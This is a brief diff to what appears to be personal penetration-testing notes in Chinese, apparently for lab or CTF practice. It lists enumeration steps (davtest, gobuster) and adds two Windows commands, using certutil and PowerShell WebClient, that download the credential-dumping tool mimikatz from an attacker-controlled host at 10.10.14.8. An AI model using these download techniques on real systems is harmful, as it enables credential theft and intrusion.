@@ -4,3 +4,11 @@
 4.davtest
 5.每個資料夾gobuster
 6.使用不同gobuster字典
+
+
+
+
+
+###widnows下載文件
+certutil.exe -urlcache -split -f http://10.10.14.8/mimikatz_trunk.exe mimikatz_trunk.exe
+(New-Object Net.Webclient).downloadFile('http://10.10.14.8/mimikatz.exe', 'mimikatz.exe')
